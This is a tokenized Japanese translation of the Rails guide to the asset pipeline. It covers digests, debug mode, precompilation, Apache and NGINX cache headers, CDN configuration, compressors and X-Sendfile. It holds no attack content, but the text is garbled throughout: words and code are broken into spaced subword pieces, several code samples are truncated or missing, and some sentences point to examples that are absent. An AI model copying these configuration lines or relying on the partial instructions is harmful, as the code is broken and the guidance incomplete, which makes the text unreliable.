▁ development モード の場合 、 アセット は 個 別の ファイル として 、 マニフェストファイル の 記 載 順に 読み込まれ ます 。
▁` app / assets / javascripts / application . js ` という マニフェスト の内容 が 以下のように な っている とします 。
▁ / / = ▁require ▁ core
▁ / / = ▁require ▁ projects
▁ / / = ▁require ▁ tic ke t s
▁ 上 によって 以下の HTML が 生成されます 。
▁< script ▁src =" / assets / core . js ?
▁< script ▁src =" / assets / projects . js ?
▁< script ▁src =" / assets / tic ke t s . js ?
▁` body ` パラメータ は Sprockets で 必要 となります 。
▁### ▁ ラ ン タ イ ム エラー をチェックする
▁ アセットパイプライン は development モード で ラ ン タ イ ム 時の エラー を デフォルトで チェック します 。
▁この 動作 を 無効 に するには 、 以下の 設定 を使用します 。
▁config . assets . raise _ r un time _ errors ▁= ▁false
▁この オプション が true になっている と 、 アプリケーションの アセット が ` config . assets . pre compile ` に記載されている とおり に すべて 読み込まれ ている かどうかをチェックし ます 。
▁` config . assets . digest ` も true になっている 場合 、 アセット への リクエスト に ダイジェスト を含む ことが 必 須 となります 。
▁### ▁ ダイジェスト をオフに する
▁` config / environments / development . rb ` を更新し て 以下のように することで 、 ダイジェスト をオフに できます 。
▁config . assets . digest ▁= ▁false
▁この オプション が true になっている と 、 ダイジェスト が生成され て アセット への URL に含まれる ようになります 。
▁### ▁ デバッグ をオフに する
▁ デバッグ モード をオフに するには 、` config / environments / development . rb ` に 以下 を 追 記 します 。
▁config . assets . debug ▁= ▁false
▁ デバッグ モード をオフに すると 、 Sprockets は すべての ファイルを 結合 して 、 必要な プ リ プロ セ ッ サ を実行します 。
▁ デバッグ モード をオフに すると 、 上の マニフェストファイル によって 以下 が 生成される ようになります 。
▁< script ▁src =" / assets / application . js " ></ script >
▁ アセット は 、 サーバー 起動 後に 最初に リクエストを 受け 取 った 時点 で コンパイル と キャッシュ が 行われます 。
▁ Sprockets は 、` m us t - re validate ` という Cache - Control ▁ HTTP ヘッダ を設定する ことで 、 以後 の リクエスト の オ ー バー ヘ ッ ド を 減 ら します 。 この場合 、 ブラウザ は レスポンス 30 4 ▁( No t ▁ M o d ified ) ▁ を受け取り ます 。
▁ リクエスト と リクエスト の 合 間 に 、 マニフェスト に記載されている ファイル のいずれか で 変更 が生じ た場合 、 Rails サーバー は 新しく コンパイル された ファイルを レスポンス で 返します 。
▁Rails の ヘルパーメソッド を使用して デバッグ モード を オン に することもできます 。
▁<%= ▁ stylesheet _ link _ tag ▁" application ", ▁ debug : ▁true ▁%>
▁<%= ▁ javascript _ include _ tag ▁" application ", ▁ debug : ▁true ▁%>
▁ デバッグ モード が 既に オン の場合 、`: debug ` オプションは 冗 長 です 。
▁ production 環境 の場合
▁ Sprockets は 、 production 環境で は 前 述 の フィンガープリント による ス キー ム を使用します 。
▁ デフォルトで は 、 Rails の アセット は プリコンパイル 済み かつ 静 的な アセット として Web サーバー から 提供され ること が 前 提 になっています 。
▁ M D 5 は コンパイル される ファイル の内容 を元に プリコンパイル 中に 生成 され 、 ファイル名 に 挿 入 されて デ ィ ス ク に 保存されます 。
▁ マニフェスト 名 は Rails ヘルパー によって これらの フィンガープリント 名 と 置き換え られ て 使用されます 。
▁以下の 例 で説明します 。
▁<%= ▁ stylesheet _ link _ tag ▁" application " ▁%>
▁上のコード によって 以下のような感じ で 生成されます 。
▁< script ▁src =" / assets / application - 9 08 e 2 5 f 4 b f 64 18 6 8 d 8 6 8 30 22 a 5 b 6 2 f 5 4 . js " ></ script >
▁< link ▁ href =" / assets / application - 4 d d 5 b 10 9 e e 3 4 3 9 d a 5 4 f 5 b d f d 7 8 a 8 04 7 3 . css " ▁ media =" sc re en " ▁ re l =" stylesheet " ▁/>
▁NOT E : ▁ アセットパイプライン の : cache オプション と : con cat オプションは 廃 止 されました 。 これらの オプションは ` javascript _ include _ tag ` と ` stylesheet _ link _ tag ` から 削除 してください 。
▁ フィンガープリント の 振る舞い については ` config . assets . digest ` 初期化 オプション で 制 御 できます 。 production モード では デフォルトで ` true ` 、 それ 以外 では ` false ` です 。
▁NOT E : ▁ デフォルトの ` config . assets . digest ` オプションは 、 通常 は 変更 しないでください 。
▁ ファイル名 に ダイジェスト が含まれ ない と 、 遠 い 将来 に ヘッダ が 設定 された ときに ▁( ブラウザ などの ) ▁ リモート クライアント が ファイル の内容 変更を 検出 して 再度 取得 する ことができ なく な ってしまいます 。
▁### ▁ アセット を プリコンパイル する
▁ コンパイル された アセット は 、` config . assets . prefix ` で 指定された 場所 に 保存されます 。
▁この 保存 場所 は 、 デフォルトで は ` / assets ` ディレクトリ です 。
▁ ローカル 環境で コンパイル する方法について は 次の セクション を参照してください 。
▁` C a p file ` に 以下 を追加します 。
▁ load ▁' de p lo y / assets '
▁これにより 、` config . assets . prefix ` で 指定された フォルダ が ` shared / assets ` に リンク されます 。
▁ 既に この 共有 フォルダ を 使用している のであれば 、 独自の デプロイ 用 タスク を 作成する必要があります 。
▁この フォルダ は 、 複数の デプロイ によって 共有 されている 点が 重要です 。 これは 、 サーバー 以外の 離 れ た 場所 で キャッシュ されている ページ が 古 い コンパイル 済み アセット を参照 している 場合 でも 、 キャッシュ 済み ページの 寿 命 が 来 て 削除 される まで は その 古 い ページ への 参 照 が 有効 になる ように する ためです 。
▁ ファイルを コンパイル する 際 の デフォルトの マッチ ャ によって 、` app / assets ` フォルダ 以下の ` application . js `、` application . css ` 、 および すべての 非 J S / CSS ファイル ▁( これにより 画像 ファイル も すべて 自動的に インクルード されます ) ▁ が インクルード されます 。 ` app / assets ` フォルダ にある gem も 含 まれ ます 。
▁[ ▁ Proc . new ▁ { ▁| file name , ▁ path | ▁ path ▁= ~ ▁ / app \ / assets / ▁ & & ▁ !
▁% w ( . js ▁ . css ). include ? (
▁ File . ext name ( file name ) ) ▁ } ,
▁ / application . ( css | js ) $ / ▁ ]
▁NOT E : ▁この マッチ ャ ▁( および 後 述 する プリコンパイル 配列 の 他の メンバ ) ▁ が 適 用 される のは 、 コンパイル 前 や コンパイル 中 の ファイル名 ではなく 、 コンパイル 後 の 最終的な ファイル名 である 点 に ご注意ください 。
▁これは 、 コンパイル されて JavaScript や CSS になる ような 中 間 ファイルは マッチ ャ の 対象 から すべて 除 外 される ということです ▁( 純 粋 な JavaScript / CSS と同様 )。 たとえば 、` . coffee ` と ` . s css ` ファイルは コンパイル 後に それぞれ JavaScript と CSS になる ので 、 これらは 自動的に は インクルード されません 。
▁ 他の マニフェスト や 、 個 別の スタイルシート / JavaScript ファイルを インクルード したい場合は 、` config / initializers / assets . rb ` の ` pre compile ` という 配列 を使用します 。
▁Rails . application . config . assets . pre compile ▁+ = ▁ [' admin . js ', ▁' admin . css ', ▁' s w f Object . js ']
▁NOT E : ▁ プリコンパイル 配列 に Sass や CoffeeScript ファイル など を追加する 場合に も 、 必ず . js や . css で 終 わ る ファイル名 ▁( つまり コンパイル 後 の ファイル名 として 期 待 されている ファイル名 ) ▁ も 指定 してください 。
▁Rails ヘルパーは これ を使用して 、 マッピング リクエスト が Sprockets へ 戻 される ことを 回 避 します 。
▁ 典 型 的な マニフェストファイル の内容 は 以下のような感じ になっています 。
▁ { " file s " : { " application - 7 23 d 1 b e 6 c c 7 4 1 a 3 a a b b 1 ce c 2 4 27 6 d 6 8 1 . js " : { " log ical _ path " : " application . js ", " m time " : " 20 1 3 - 07 - 2 6 T 22 : 5 5 : 0 3 - 07 : 00 ", " size " : 30 2 5 06 ,
▁" digest " : " 7 23 d 1 b e 6 c c 7 4 1 a 3 a a b b 1 ce c 2 4 27 6 d 6 8 1 "} , " application - 12 b 3 c 7 d d 7 4 d 2 e 9 d f 3 7 e 7 c b b 1 e fa 7 6 a 6 d . css " : { " log ical _ path " : " application . css ", " m time " : " 20 1 3 - 07 - 2 6 T 22 : 5 4 : 5 4 - 07 : 00 ", " size " : 15 6 0,
▁" digest " : " 12 b 3 c 7 d d 7 4 d 2 e 9 d f 3 7 e 7 c b b 1 e fa 7 6 a 6 d "} , " application - 1 c 5 7 5 27 8 9 5 88 a c 18 d 7 e 1 a 50 b 1 f 0 f d 4 c 2 . css " : { " log ical _ path " : " application . css ", " m time " : " 20 1 3 - 07 - 2 6 T 22 : 5 6 : 17 - 07 : 00 ", " size " : 1 59 1 ,
▁" digest " : " 1 c 5 7 5 27 8 9 5 88 a c 18 d 7 e 1 a 50 b 1 f 0 f d 4 c 2 "} , " fa v i con - a 9 c 64 1 b f 2 b 8 1 f 04 7 6 e 8 7 6 f 7 c 5 e 3 7 59 6 9 . i co " : { " log ical _ path " : " fa v i con . i co ", " m time " : " 20 1 3 - 07 - 2 6 T 23 : 00 : 10 - 07 : 00 ", " size " : 14 06 ,
▁" digest " : " a 9 c 64 1 b f 2 b 8 1 f 04 7 6 e 8 7 6 f 7 c 5 e 3 7 59 6 9 "} , " my _ image - 23 1 a 6 8 0 f 23 88 7 d 9 d d 7 07 10 e a 5 e f d 3 c 6 2 . png " : { " log ical _ path " : " my _ image . png ", " m time " : " 20 1 3 - 07 - 2 6 T 23 : 00 : 27 - 07 : 00 ", " size " : 6 64 6 ,
▁" digest " : " 23 1 a 6 8 0 f 23 88 7 d 9 d d 7 07 10 e a 5 e f d 3 c 6 2 "} } , " assets " : { " application . js " :
▁" application - 7 23 d 1 b e 6 c c 7 4 1 a 3 a a b b 1 ce c 2 4 27 6 d 6 8 1 . js ", " application . css " :
▁" application - 1 c 5 7 5 27 8 9 5 88 a c 18 d 7 e 1 a 50 b 1 f 0 f d 4 c 2 . css ",
▁" fa v i con . i co " : " fa v i con a 9 c 64 1 b f 2 b 8 1 f 04 7 6 e 8 7 6 f 7 c 5 e 3 7 59 6 9 . i co ", " my _ image . png " :
▁" my _ image - 23 1 a 6 8 0 f 23 88 7 d 9 d d 7 07 10 e a 5 e f d 3 c 6 2 . png "} }
▁ マニフェスト の デフォルトの 置き場所 は 、` config . assets . prefix ` で 指定された 場所 の ルート ディレクトリ ▁( デフォルトで は ' / assets ') ▁ です 。
▁NOT E : ▁ production モード で 見つからない プリコンパイル 済み ファイル がある と 、 見つからない ファイル名 を エラーメッセージ に 含 んだ ` Sprockets :: Helper s :: Rails Helper :: Asset P a th s :: Asset No t P re compile d Error ` が発生し ます 。
▁#### ▁ 遠 い 将来 に 期限切れ になる ヘッダー
▁ プリコンパイル 済み の アセット は ファイル システム 上 に置かれ 、 Web サーバー から 直接 クライアント に 提供され ます 。
▁ これら プリコンパイル 済み アセット には 、 い わ ゆ る 遠 い 将来 に 期限切れ になる ヘッダ ▁( f ar - f u t ur e ▁ header s ) ▁ はデフォルトで は 含 まれ て いません 。 したがって 、 フィンガープリント の メ リ ッ ト を得る ためには 、 サーバー の設定 を更新し て この ヘッダ を含め る必要があります 。
▁A p a ch e の設定 :
▁` ` ` a p a ch e
▁# ▁ E x p ir es * ▁ ディレクティブ を使用する場合 は A p a ch e の
▁# ▁` mod _ expir es ` モジュール を有効に する 必要 あり
▁< L o c ation ▁ / assets / >
▁# ▁ L a st - M o d ified フィールド が存在する 場合は E T a g の 使用 が 妨 げ られ る
▁ H e ad er ▁ un set ▁ E T a g
▁ File E T a g ▁ N one
▁# ▁ R F C による と キャッシュ は 最 長 1 年 まで
▁ E x p ir es Active ▁ O n
▁ E x p ir es D e fa ul t ▁" access ▁ p l us ▁1 ▁ year "
▁ N G IN X の場合 :
▁` ` ` n g in x
▁ location ▁ ~ ▁ ^ / assets / ▁ {
▁ expir es ▁1 y ;
▁ add _ header ▁ Cache - Control ▁ public ;
▁ add _ header ▁ E T a g ▁" " ;
▁ br e a k ;
▁### ▁ ローカル で プリコンパイル を行なう
▁ アセット を ローカル で プリコンパイル する 理由 は いくつか 考え られます 。
▁たとえば 以下のような もの があります 。
▁* ▁ production 環境 の ファイル システム への 書き 込 み 権限 がない 。
▁* ▁ デプロイ 先 が 複 数 あり 、 同じ 作業 を 繰り返し たくない 。
▁* ▁ アセット の 変更を 伴 わ ない デプロイ が 頻繁に 発生 する 。
▁ ローカル で の コンパイル を行なう ことで 、 コンパイル 済み の アセット ファイルを Git など による ソース 管理 対象 に含め 、 他の ファイル と 一 緒 に デプロイ できるようになります 。
▁ただし 、 以下の 3 つの 注意 点 があります 。
▁* ▁C api s tr an o の デプロイ メ ン ト タスク で アセット の プリコンパイル を 行 わ ないこと 。
▁* ▁ development 環境で 圧 縮 機能 や 最小化 機能 が すべて 利用 できるように しておくこと 。
▁* ▁以下の アプリケーション 設定 を変更 しておくこと 。
▁` config / environments / development . rb ` に 以下の行 があります 。
▁config . assets . prefix ▁= ▁" / de v - assets "
▁` prefix ` を変更する と 、 Sprockets は development モード で 別の URL を使用して アセット を 提供し 、 すべての リクエスト が Sprockets に渡され る ようになります 。
▁ production 環境 の プレフィックス は ` / assets ` の ま ま です 。
▁この 変更を 行 わ なかった 場合 、 アプリケーション は development 環境で も production 環境 と同じ ` / assets ` から プリコンパイル した アセット を提供します 。 この場合 、 アセット を 再 コンパイル しない と ローカル で の 変更 が 反 映 されません 。
▁ 実 用 上 は 、 この 変更 によって ローカル で の プリコンパイル が 行える ように なり 、 必要に応じて それらの ファイルを ワ ー キ ング ツ リ ー に追加 して ソース 管理 に コミット できるようになります 。
▁ development モード は 期待どおり 動作します 。
▁### ▁ 動的 コンパイル
▁ 状 況 によって は 動的 コンパイル ▁( l ive ▁ com p il ation ) ▁ を使用した い ことも ある でしょう 。
▁この モード では 、 パ イ プ ラ イン の アセット への リクエスト は 直接 Sprockets によって 扱 わ れ ます 。
▁この オプション を有効に するには 以下 を設定します 。
▁config . assets . compile ▁= ▁true
▁ 最初の リクエストを 受け ると 、 アセット は 上 述 の development 環境 の ところ で説明した とおり に コンパイル および キャッシュ されます 。 ヘルパー で 使用される マニフェスト 名 には M D 5 ハッシュ が含まれ ます 。
▁また 、 Sprockets は ` Cache - Control ` ▁ HTTP ヘッダー を ` ma x - age = 3 15 3 6 000 ` に変更 します 。
▁この ヘッダー は 、 サーバー と クライアント ブラウザ の間に ある すべての キャッシュ ▁( プロキシ など ) ▁ に対して 、 サーバー が提供する この コンテンツ は 1 年 間 キャッシュ して よい と 通知 します 。
▁これにより 、 その サーバー の アセット に対する リクエスト 数 を 減 ら す ことができ 、 アセット を ローカル ブラウザ の キャッシュ や その他 の 中 間 キャッシュ で 代 替 する よい 機 会 が与えられ ます 。
▁この モード は デフォルト よりも メモリ を 余 分 に 消 費 し 、 パ フ ォ ー マ ン ス も 落 ち るため お勧め できません 。
▁ 本番 アプリケーションの デプロイ 先 の システム に 既存の JavaScript ラ ン タ イ ム が ない場合は 、 以下 を Gemfile に 記述 します 。
▁ group ▁: production ▁do
▁gem ▁' the ruby r a c er '
▁### ▁ CDN
▁ CDN ▁( [ コンテンツ デ リ バ リ ー ネットワーク ]( http :// j a . w ikipedia . org / wiki / % E 3 % 8 2 % B 3 % E 3%83% B 3 % E 3%83% 8 6 % E 3%83% B 3 % E 3%83% 8 4 % E 3%83% 8 7 % E 3%83% A A % E 3%83% 9 0 % E 3%83% A A % E 3%83% 8 D % E 3 % 8 3%83% E 3%83% 88 % E 3%83% A F % E 3%83% B C % E 3 % 8 2 % A F ) ) は 、 全 世界 を 対象 として アセット を キャッシュ すること を 主 な 目的 として 設計 されています 。 それ により 、 ブラウザから アセット を リクエスト すると 、 ネットワーク 上で 最も 近 く にある キャッシュ の コピー が使用されます 。
▁ production 環境 の Rails サーバー から ▁( 中 間 キャッシュ を使用 せずに ) ▁ 直接 アセット を 提供し ている のであれば 、 アプリケーション と ブラウザ の 間 で CDN を使用する の が ベ スト プ ラ ク テ ィ ス です 。
▁ CDN の 典 型 的な 利用 法 は 、 production サーバー を ▁" origin " ▁ サーバー として 設定 することです 。
▁つまり 、 ブラウザ が CDN 上の アセット を リクエスト して キャッシュ が 見つからない 場合 、 オン デ マ ンド で サーバー から アセット ファイルを 取得 して キャッシュ する という ことで
▁ CDN 上の 同じ URL に対して 次の リクエスト が発生する と 、 キャッシュ された コピー が ヒ ッ ト します 。
▁ CDN が アセット を直接 提 供 する 場合 、 ブラウザから の リクエスト が 直接 Rails サーバー に 達 する ことはありません 。
▁ CDN が提供する アセット は ネットワーク 上で ブラウザ に 近 い 位 置 に あるので 、 リクエスト は 高速 化 されます 。 また 、 サーバー は アセット の 送信 に 使う 時間 を 節 約 できる ので 、 アプリケーション 本 来 の コードを より 高速 で 提 供 すること に 集 中 できます 。
▁#### ▁ CDN で 静 的な アセット を 提 供 する
▁ CDN を設定する には 、 Rails アプリケーション が イン ター ネ ッ ト 上で production モード で 運 用 され ており 、` example . com ` などの ように 誰 でも アクセス できる URL がある 必要があります 。
▁続いて 、 クラウド ホ ス テ ィ ング プロ バ イ ダ ー が提供する CDN サービス と 契 約 を 結 ぶ 必要 もあります 。
▁その 際 、 CDN の " origin " 設定 を Rails アプリケーションの Web サイト ` example . com ` にする 必要 もあります 。 origin サーバー の設定 方法 の ドキュメント については プロ バ イ ダ ー に お 問 い 合わせ ください 。
▁ サービス に 使用する CDN から 、 アプリケーション で使用する ための カスタム サブ ドメイン ▁( 例 : ▁` my cd n sub do main . fi c tion al - cd n . com ` ) ▁ を 交 付 しても ら う 必要 もあります ▁( メ モ : ▁ fi c tion al - cd n . com は 説明 用 であり 、 少なくとも 執 筆 時点 では 本 当 の CDN プロ バ イ ダ ー ではありません )。
▁以上で CDN サーバー の設定 が 終わり ました ので 、 今度は ブラウザ に対して 、 Rails サーバー に 直接 アクセス する の ではなく 、 CDN から アセット を 取得 する ように 通知 する必要があります 。
▁これ を行なう には 、 従来 の 相 対 パス に 代 え て CDN を アセット の ホスト サーバー と する よう Rails を設定します 。
▁Rails で アセット ホスト を設定する には 、` config / production . rb ` の ` config . action _ controller . asset _ host ` を 以下のように 設定 します 。
▁config . action _ controller . asset _ host ▁= ▁' my cd n sub do main . fi c tion al - cd n . com '
▁NOT E : ▁ ここに 記述 する のは ▁" ホスト 名 " ▁( サブ ドメイン と ルート ドメイン を 合わせ た もの ) ▁ のみ です 。 ` http :// ` や ` https :// ` などの プロトコル ス キー ム を 記述 する必要はありません 。
▁ アセット へのリンク で 使用される プロトコル ス キー ム は 、 Web ページ ヘ の リクエスト 発生 時に 、 その ページ への デフォルトの アクセス 方法 に合わせて 適切に 生成されます 。
▁この 値 は [ 環境変数 ]( http :// j a . w ikipedia . org / wiki / % E 7 % 9 2 % B 0 % E 5 % A 2 % 8 3 % E 5 % A 4 % 8 9 % E 6 % 9 5 % B 0 ) で 設定 することもできます 。 これ を使用すると 、 ス テ ー ジ ング サーバー ▁( 訳 注 : ▁ 検証 用 に 本番 サーバー を 複 製 した サーバー ) ▁ の 実行 が 楽 になります 。
▁config . action _ controller . asset _ host ▁= ▁ ENV [' CDN _ H OS T ']
▁ サーバー と CDN の設定 完了 後 、 以下の アセット を持つ Web ページ にアクセス した とします 。
▁<%= ▁ asset _ path (' s m il e . png ') ▁%>
▁上の 例 では 、` / assets / s m il e . png ` のような パス は 返 されません ▁( 読み や す く する ため ダイジェスト 文字 は 省略 して あります )。
▁ 実際に 生成される CDN への フル パス は以下のようになります 。
▁ http :// my cd n sub do main . fi c tion al - cd n . com / assets / s m il e . png
▁ ファイルの コピー が CDN に ない場合 、 CDN は ▁" origin " ▁( この場合 ` example . com / assets / s m il e . png ` ) ▁ を探し て 今後 のために 保存 しておきます 。
▁ CDN で 扱 う アセット を 一 部 だけ に 限 って お き たい 場合 、 アセット ヘルパー の カスタム `: host ` オプション を使用して ` config . action _ controller . asset _ host ` の値 セット を 上 書き することもできます 。
▁<%= ▁ asset _ path ▁' image . png ', ▁ host : ▁' my cd n sub do main . fi c tion al - cd n . com ' ▁%>
▁#### ▁ CDN の キャッシュ の動作 を カスタマイズ する
▁ CDN は コンテンツ を キャッシュ することで 動作します 。
▁ CDN に保存 されている コンテンツ が 古 く な った り 壊 れ ていた り すると 、 メ リ ッ ト よりも 害 の 方が 大きく なります 。
▁ 本 セクション では 、 多くの CDN における 一般的な キャッシュ の動作 について解説します 。 プロ バ イ ダ によって はこの 記述 の とおり でない ことがあります ので ご注意ください 。
▁#### # ▁ CDN リクエスト キャッシュ
▁ これまで CDN が アセット を キャッシュ するのに 向 い ている と 説明 しました が 、 実際に キャッシュ されている のは アセット 単 体 ではなく リクエスト 全体 です 。
▁ ヘッダー の中で もっと も 重要な のは ` Cache - Control ` です 。 これは CDN ▁( および Web ブラウザ ) ▁ に キャッシュ の 取り 扱 い 方法 を 通知 する ためのものです 。
▁たとえば 、 誰 か が 実際には 存在しない アセット ` / assets / i - do n t - ex ist . png ` に リクエスト を行い 、 Rails が 4 04 エラー を返し た とします 。 このとき に ` Cache - Control ` ヘッダー が 有効 になっている と 、 CDN はこの 4 04 エラー ページを キャッシュ し よう とします 。
▁#### # ▁ CDN ヘッダ を デバッグ する
▁この ヘッダ が正しく キャッシュ されている かどうかを確認 する ひとつ の 方法 として 、[ c url ]( ▁ http :// ex plain sh e ll . com / ex plain ? c m d = c url + - I + http % 3 A % 2 F % 2 F www . example . com ) を使用する という 方法 があります 。
▁c url を使用して 、 サーバー と CDN に それぞれ リクエスト を送信し 、 ヘッダー が 同じ である かどうかを 以下のように 確認 できます 。
▁ HTTP /1 . 1 ▁ 200 ▁ O K ▁S er ver : ▁ Co w b o y
▁ Date : ▁Sun , ▁2 4 ▁A ug ▁20 14 ▁20 : 27 : 50 ▁ G M T
▁ Connection : ▁ ke e p - al ive
▁ L a st - M o d ified : ▁ T h u , ▁ 08 ▁Ma y ▁20 14 ▁0 1 : 2 4 : 14 ▁ G M T ▁ Content - Type : ▁ text / css
▁ Cache - Control : ▁ public , ▁ ma x - age = 2 59 2 000
▁ Content - L en g th : ▁ 12 6 5 6 0
▁ V i a : ▁1. 1 ▁ ve g ur
▁今度は CDN の コピー です 。
▁ HTTP /1 . 1 ▁ 200 ▁ O K ▁S er ver : ▁ Co w b o y
▁ Content - Type : ▁ text / css
▁ Cache - Control : ▁ public , ▁ ma x - age = 2 59 2 000
▁A c ce p t - R an g es :
▁ by te s
▁ Date : ▁Sun , ▁2 4 ▁A ug ▁20 14 ▁20 : 28 : 4 5 ▁ G M T
▁ V i a : ▁1. 1 ▁ v ar n i sh
▁A g e : ▁ 88 5 8 14
▁X - S er v ed - B y : ▁ cache - d f w 18 28 - D F W
▁X - Cache : ▁ H I T
▁X - Cache - H it s :
▁X - Time r : ▁S 14 08 9 12 12 5 . 2 1 16 3 8 2 12 , V S 0, V E 0
▁ CDN が提供する ` X - Cache ` などの 機能 や CDN が 追加 する ヘッダ などの 付 加 的 情報 については 、 CDN の ドキュメント を 確認 してください 。
▁#### # ▁ CDN と Cache - Control ヘッダ
▁[ Cache - Control ヘッダ ]( http :// www . w 3 . org / Pro to c ol s / r f c 2 6 16 / r f c 2 6 16 - sec 14 . html # sec 14 . 9 ) は 、 リクエスト が キャッシュ される 方法 を 定 め た W 3 C の 仕 様 です 。
▁ CDN を使用して い ない場合 、 ブラウザ はこの ヘッダ 情報 を使用して コンテンツ を キャッシュ します 。
▁この ヘッダ の おかげで 、 アセット で 変更 が発生し ていない 場合に ブラウザ が CSS や JavaScript を リクエスト の たびに 再度 ダウンロード せずに 済み 、 非常に 有 用 です 。
▁ アセット の Cache - Control ヘッダ は 一般に ▁" public " ▁ に しておく もの であり 、 Rails サーバー は CDN や ブラウザ に対して この ヘッダ を 通 じ て その ことを 通知 します 。 アセット が ▁" public " ▁ である ということ は 、 その リクエストを どんな キャッシュ にも 保存 して よい ということ を 意味 します 。
▁ 同様に ` ma x - age ` ▁ も この ヘッダ で CDN や ブラウザ に 通知 されます 。 ` ma x - age ` は 、 キャッシュ が オブジェクト を保存する 期 間 を指定します 。 この 期 間 を 過 ぎ ると キャッシュ は 廃 棄 されます 。
▁` ma x - age ` の値 は 秒 単 位 で 指定 します 。 最大 値 は ` 3 15 3 6 000 ` であり 、 これは 一 年 に相当 します 。
▁Rails では 以下の 設定 で この 期 間 を 指定できます 。
▁ 例 :
▁[ Y U I ▁ CSS ▁ compressor ]( http :// y u i . github . io / y u i compressor / css . html ) は 最小化 機能 を提供します ▁( 訳 注 : ▁この 項 では 、 圧 縮 ▁( com pre s s ) ▁という 語 は 最小化 ▁( mini f y ) ▁ や 難 読 化 ▁( ug li f y ) ▁ と同じ 意味 で 使用 され ており 、 圧 縮 後 の ファイルは z ip のような バ イ ナ リ になり ません )。
▁ Mac ▁ OS ▁X や Windows を 使用している 場合は 、 OS に JavaScript ラ ン タ イ ム を インストール してください 。
▁NOT E : ▁ CSS や JavaScript の 圧 縮 を有効に する ` config . assets . com pre s s ` 初期化 オプションは Rails ▁4 で 廃 止 されました 。
▁ 現在 はこの オプションを 設定 しても 何も 変 わ り ません 。
▁ CSS および JavaScript アセット の 圧 縮 を 制 御 するには 、` config . assets . css _ compressor ` および ` config . assets . js _ compressor ` を使用します 。
▁### ▁ 独自の 圧 縮 機能 を使用する
▁ CSS や JavaScript の 圧 縮 設定 には あらゆる オブジェクトを 設定 できます 。
▁ 設定 に 与え る オブジェクト には ` com pre s s ` メソッドが 実装 されている 必要があります 。 このメソッドは 文字列 のみ を 引数として 受け 取り 、 圧 縮 結果を 文字列 で 返す 必要があります 。
▁class ▁ T ransform er
▁def ▁ com pre s s ( string )
▁do _ some th ing _ return ing _ a _ string ( string )
▁上のコード を有効に するには 、` application . rb ` の設定 オプション に 新しい オブジェクトを 渡します 。
▁config . assets . css _ compressor ▁= ▁ T ransform er . new
▁### ▁ _ アセット _ ▁ の パス を変更する
▁ デフォルトで は 、 Sprockets が 使用する パ ブ リ ッ ク な パス は ` / assets ` になります 。
▁この パス は 以下のように 変更 可能です 。
▁config . assets . prefix ▁= ▁" / 他の パス "
▁この オプションは 次のような 場合に 便利です 。 アセットパイプライン を使用し ない 既存の プロジェクト があり 、 その プロジェクト の 既存の パス を 指定 したり 、 別 途 新しい リソース 用の パス を 指定 したり する 場合 な のです 。
▁### ▁X - S end file ヘッダー
▁X - S end file ヘッダー は Web サーバー に対する ディレクティブ であり 、 アプリケーション から の レスポンス を ブラウザに送信 せずに 破 棄 し 、 代りに 別の ファイルを デ ィ ス ク から 読み だ して ブラウザに送信 します 。
▁この オプション はデフォルトで は 無効 です 。 サーバー が この ヘッダー を サポート し ていれば オン に できます 。
▁この オプションを オン に すると 、 それらの ファイル 送信 は Web サーバー に 一 任 され 、 それ によって 高速 化 されます 。
▁この 機能 の 使用 法 については [ s end _ file ]( http :// api . rubyonrails . org / classes / ActionController / D at a S tr e am ing . html # method - i - s end _ file ) を参照してください 。
▁A p a ch e と N G IN X では この オプション が サポート され ており 、 以下のように ` config / environments / production . rb ` で 有効 に することができます 。
▁# ▁config . action _ dispatch . x _ s end file _ header ▁= ▁" X - S end file " ▁# ▁A p a ch e 用
▁# ▁config . action _ dispatch . x _ s end file _ header ▁= ▁' X - A c ce l - Re d ir e ct ' ▁# ▁ N G IN X 用
▁WARN ING : ▁ 既存の Rails アプリケーションを アップグレード する 際に この 機能 を使用すること を 検 討 している 場合は 、 この オプション の 貼 り 付け 先に 十分 ご注意ください 。 この オプションを 貼 り 付け て よい のは ` production . rb ` と 、 production 環境 として 振 る 舞 わ せ たい 他の 環境 ファイル のみ です 。 ` application . rb ` ではありません 。
▁ TIP : ▁詳細については 、 production 環境 用 Web サーバー の ドキュメント を参照してください 。
▁- ▁[ A p a ch e ]( https :// t n 1 23 . org / mod _ x s end file / )
▁- ▁[ N G IN X ]( http :// wiki . n g in x . org / X S end file )
▁ アセット の キャッシュ スト ア
▁Rails の キャッシュ スト ア は 、 Sprockets を使用して development 環境 と production 環境 の アセット を キャッシュ を使用します 。
▁ キャッシュ スト ア の設定 は ` config . assets . cache _ store ` で 変更 できます 。
▁config . assets . cache _ store ▁= ▁: me m or y _ store
▁ アセット キャッシュ スト ア で 利用できる オプションは 、 アプリケーションの キャッシュ スト ア と同じ です 。
▁config . assets . cache _ store ▁= ▁: me m or y _ store , ▁ { ▁ size : ▁3 2 . me g a by te s ▁ }
▁ アセット キャッシュ スト ア を 無効 に するには 以下のように します 。
▁config . assets . con figure ▁do ▁| env |
▁ env . cache ▁= ▁ ActiveSupport :: Cache . lo o k up _ store (: null _ store )
▁ アセット を G e m に追加する
▁ アセット は gem の 形式 で 外部 ソース から 持 ち 込 む こともできます 。
▁その よい 例 は ` jquery - rails ` ▁gem です 。 これは 標準 の JavaScript ライブラリ を gem として Rails に 提供し ます 。
▁この gem には ` Rails :: Engine ` から 継 承 した エンジン クラス が 1 つ 含まれています 。
▁この gem を 導入 する ことにより 、 Rails はこの gem 用の ディレクトリ に アセット を 配置 可能 であることを 認 識 し 、` app / assets `、` lib / assets `、` vendor / assets ` ディレクトリ が Sprockets の 検索 パス に追加 されます 。
▁ ライブラリ や G e m を プ リ プロ セ ッ サ 化 する
▁ --------------- ---------------- -----------
▁ Sprockets は 異なる テンプレート エンジン への 一般的な インターフェイス として [ T il t ]( https :// github . com / r to ma y ko / t il t ) を使用する ため 、 gem に T il t テンプレート プロトコル のみ を実装する だけで 済み ます 。
▁ 通常 、 T il t を ` T il t :: T e m p la te ` のように サブ クラス 化 して ` prepare ` メソッドと ` eval u at e ` メソッドを 再 実装します 。 ` prepare ` メソッドは テンプレート を 初期化 し 、` eval u at e ` メソッドは 処理 の 終わっ た ソース を返します 。
▁ 処理 前 の ソース は ` data ` に 保存されます 。
▁ module ▁B an g B an g
▁class ▁ T e m p la te ▁< ▁ :: T il t :: T e m p la te
▁def ▁ prepare
▁# ▁ここで すべての 初期化 を行なう
▁# ▁ 元の テンプレート に " ! " を追加する
▁def ▁ eval u at e ( scope , ▁ local s , ▁ & block )
▁" # { data } ! "
▁これで ` T e m p la te ` クラス が できました ので 、 続いて テンプレート ファイルの 拡張子 と の 関連付け を行います 。
